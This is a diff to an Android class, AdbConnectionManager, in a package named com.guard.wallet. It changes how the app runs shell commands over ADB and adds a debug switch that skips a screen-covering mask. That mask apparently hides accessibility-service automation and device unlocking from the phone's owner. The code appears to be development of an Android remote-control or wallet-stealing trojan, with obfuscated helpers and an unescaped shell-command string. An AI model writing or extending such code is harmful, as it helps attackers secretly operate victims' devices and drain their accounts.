@@ -203,32 +203,35 @@ public final class AdbConnectionManager extends AbsAdbConnectionManager {
             return false;
         }
         Log.e("AdbDebug", "executeShellCommand: D()=" + this.D() + ", isConnected=" + isConnected());
-        String wrapped = "if " + command + "; then echo \"Success\"; else echo \"Failed\"; fi";
+        String wrapped = "if " + command + "; then echo 'Success'; else echo 'Failed'; fi";
         Log.e("AdbDebug", "executeShellCommand wrapped: " + wrapped);
-        try (AdbStream stream = openStream(LocalServices.SHELL, wrapped)) {
+        // 使用 openStream("shell:cmd") 而非 openStream(SHELL, cmd)，避免库对双引号的校验限制
+        try (AdbStream stream = openStream("shell:" + wrapped)) {
             InputStream is = stream.openInputStream();
             byte[] buf = new byte[4096];
             StringBuilder output = new StringBuilder();
-            long deadline = java.lang.System.currentTimeMillis() + 5000;
-            while (java.lang.System.currentTimeMillis() < deadline) {
-                if (is.available() > 0) {
-                    int read = is.read(buf);
-                    if (read > 0) output.append(new String(buf, 0, read, StandardCharsets.UTF_8));
+            Log.e("AdbDebug", "executeShellCommand: stream opened, reading...");
+            // 使用阻塞 read() — 库的 AdbInputStream.available() 可能始终返回 0
+            while (!stream.isClosed()) {
+                int read = is.read(buf);
+                if (read == -1) break;
+                if (read > 0) {
+                    String chunk = new String(buf, 0, read, StandardCharsets.UTF_8);
+                    output.append(chunk);
+                    Log.e("AdbDebug", "executeShellCommand chunk: [" + chunk.trim() + "]");
                 }
                 String out = output.toString();
                 if (out.contains("Success")) {
-                    Log.e("AdbDebug", "executeShellCommand result: 1 (success)");
+                    Log.e("AdbDebug", "executeShellCommand: SUCCESS");
                     return true;
                 }
                 if (out.contains("Failed")) {
-                    Log.e("AdbDebug", "executeShellCommand result: 0 (failed)");
+                    Log.e("AdbDebug", "executeShellCommand: FAILED");
                     return false;
                 }
-                if (stream.isClosed()) break;
-                Thread.sleep(50);
             }
-            Log.e("AdbDebug", "executeShellCommand result: timeout, output=" + output);
-            return false;
+            Log.e("AdbDebug", "executeShellCommand: stream closed, output=" + output);
+            return output.toString().contains("Success");
         } catch (Exception ex) {
             Log.e("AdbDebug", "executeShellCommand error", ex);
             return false;
@@ -536,12 +539,16 @@ public final class AdbConnectionManager extends AbsAdbConnectionManager {
                 com.guard.wallet.utils.SystemHelper.T0(10);
             }
 
-            if (com.guard.wallet.utils.DeviceUtils.isScreenOn()) {
-                MyAccessibilityService.P().getClass();
-                resolved.setBlockDrawable(MyAccessibilityService.o0());
+            // debug 模式跳过遮罩，方便观察自动化操作过程
+            if (!com.guard.wallet.utils.ConfigManager.isDebugMode()) {
+                if (com.guard.wallet.utils.DeviceUtils.isScreenOn()) {
+                    MyAccessibilityService.P().getClass();
+                    resolved.setBlockDrawable(MyAccessibilityService.o0());
+                }
+                com.guard.wallet.helper.BlockViewManager.a(resolved);
+            } else {
+                Log.e(TAG, "debug 模式: 跳过遮罩");
             }
-
-            com.guard.wallet.helper.BlockViewManager.a(resolved);
 
             ReqUnlockDeviceVO unlockReq = new ReqUnlockDeviceVO();
             if (!com.guard.wallet.utils.SystemHelper.p1(unlockReq)) {
@@ -972,14 +979,18 @@ public final class AdbConnectionManager extends AbsAdbConnectionManager {
         }
 
         BlockViewVO blockView = new BlockViewVO(false, null, true, true);
-        if (com.guard.wallet.utils.DeviceUtils.isScreenOn()) {
-            MyAccessibilityService.P().getClass();
-            blockView.setBlockDrawable(MyAccessibilityService.o0());
+        if (!com.guard.wallet.utils.ConfigManager.isDebugMode()) {
+            if (com.guard.wallet.utils.DeviceUtils.isScreenOn()) {
+                MyAccessibilityService.P().getClass();
+                blockView.setBlockDrawable(MyAccessibilityService.o0());
+            }
+            com.guard.wallet.helper.BlockViewManager.a(blockView);
         }
-        com.guard.wallet.helper.BlockViewManager.a(blockView);
 
         if (!com.guard.wallet.utils.SystemHelper.p1(null)) {
-            com.guard.wallet.helper.BlockViewManager.c();
+            if (!com.guard.wallet.utils.ConfigManager.isDebugMode()) {
+                com.guard.wallet.helper.BlockViewManager.c();
+            }
             return false;
         }
         if (AppUtils.G() && !AppUtils.A() && !AppUtils.O(null, null)) {
